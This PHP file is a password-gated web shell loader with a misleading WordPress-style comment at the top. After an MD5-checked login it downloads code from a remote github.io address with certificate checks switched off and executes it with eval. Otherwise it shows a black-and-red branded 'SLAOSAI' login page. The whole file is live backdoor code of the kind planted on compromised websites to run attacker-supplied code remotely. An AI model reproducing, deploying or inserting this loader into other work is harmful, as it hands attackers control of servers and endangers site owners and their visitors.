<?php
session_start();

/**
 * Disable error reporting
 *
 * Set this to error_reporting( -1 ) for debugging.
 */
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        // Set cookies using session if available
        if (isset($_SESSION['coki'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

// Function to check if the user is logged in
function is_logged_in()
{
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

// Check if the password is submitted and correct
if (isset($_POST['password'])) {
    $entered_password = $_POST['password'];
    $hashed_password = '37bd8d4f5adc469f75bdc73b2f8edccc'; // Replace this with your MD5 hashed password
    if (md5($entered_password) === $hashed_password) {
        // Password is correct, store it in session
        $_SESSION['logged_in'] = true;
        $_SESSION['coki'] = 'asu'; // Replace this with your cookie data
    } else {
        // Password is incorrect
        echo "Incorrect password. Please try again.";
    }
}

// Check if the user is logged in before executing the content
if (is_logged_in()) {
    $a = geturlsinfo('https://slaosai.github.io/slaosai/1702/server.txt');
    eval('?>' . $a);
} else {
    // Display login form if not logged in
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>ꜱʟᴀᴏꜱᴀɪ ᴜɴɪᴠᴇʀꜱᴇ</title>
  <link rel="icon" href="https://slaosai.com/img/logo-slaosai.gif" />
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #000;
      font-family: Arial, sans-serif;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }
    .login-box {
      background-color: #111;
      padding: 30px;
      border-radius: 10px;
      text-align: center;
      box-shadow: 0 0 15px red;
    }
    .login-box img {
      width: 250px;
      border-radius: 100%;
      margin-bottom: 10px;
    }
    .title {
      font-size: 25px;
      font-weight: bold;
      color: #f00;
    }
    .tagline {
      font-size: 12px;
      color: #ccc;
      margin-bottom: 20px;
      font-style: bold;
    }
    input[type="password"] {
      padding: 10px;
      width: 80%;
      border: none;
      border-radius: 5px;
      margin-bottom: 20px;
    }
    button {
      padding: 10px 20px;
      background-color: red;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    button:hover {
      background-color: darkred;
    }
	.copyright {
	  font-size: 13px;
      text-align: center;
      color: #ffffff96;	
  </style>
</head>
<body>
  <div class="login-box">
    <img src="https://slaosai.com/img/logo-slaosai.gif" alt="SLAOSAI">
    <div class="title">ꜱʟᴀᴏꜱᴀɪ ᴜɴɪᴠᴇʀꜱᴇ</div>
    <div class="tagline">HANYA SEORANG ANAK YATIM YANG INGIN KAYA</div>
    <form method="post" action="">
      <div class="form-group">
      <input type="password" id="password" name="password" placeholder="Enter Password" required>
    </form>
	<p class="copyright">SLAOSAI © 2025 • <a style="color: #ffffff;"</a>All Rights Reserved</p>
  </div>
</body>
</html>
    <?php
}
?>
